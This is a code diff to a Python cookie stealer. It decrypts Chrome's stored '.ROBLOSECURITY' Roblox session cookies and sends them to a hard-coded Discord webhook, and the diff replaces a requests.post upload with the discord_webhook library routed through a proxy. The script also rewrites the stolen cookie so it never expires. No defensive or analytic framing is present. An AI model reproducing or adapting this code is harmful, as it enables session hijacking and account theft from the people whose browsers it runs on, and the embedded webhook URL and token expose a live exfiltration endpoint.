@@ -5,7 +5,7 @@ import sqlite3
 from datetime import datetime, timedelta
 import win32crypt
 from Crypto.Cipher import AES
-import requests
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
 def get_chrome_datetime(chromedate):
     if chromedate != 86400000000 and chromedate:
@@ -66,29 +66,24 @@ WHERE host_key like '%roblox.com%' AND name like '%ROBLOSECURITY%'""")
             else:
                 decrypted_value = value
 
-            data = {
-                "content": "",
-                "username": "cockie",
-            }
-
-            data["embeds"] = [
-                {
-                    "description" : decrypted_value,
-                    "title" : f"cookie ^"
-                }
-            ]
-            url = f"https://ptb.discord.com/api/webhooks/964477768601567294/2Wi3lyDvD7DZ93ikQk9s9zmpsRk0Rho6BtXauf-pJbq5VswwnFwQ-otlP75Ih1gmbIyz"
-            
-            result = requests.post(url, json = data)
-
-            
-
-
             cursor.execute("""UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
             WHERE host_key = ?
             AND name = ?""", (decrypted_value, host_key, name))
         db.commit()
         db.close()
+        
+    proxys = {
+    'http': 'http://10.10.1.10:3128',
+    'https': 'http://10.10.1.10:1080',
+    }
+    urll = f"https://ptb.discord.com/api/webhooks/964477768601567294/2Wi3lyDvD7DZ93ikQk9s9zmpsRk0Rho6BtXauf-pJbq5VswwnFwQ-otlP75Ih1gmbIyz"
+    webhook = DiscordWebhook(url= urll)
+    embed = DiscordEmbed(title="cockie", description=f"new cookie^ {decrypted_value}", proxies= proxys)
+    embed.set_timestamp()
+    webhook.add_embed(embed)
+    
+    response = webhook.execute()
+    
 
 if __name__ == "__main__":
     main()
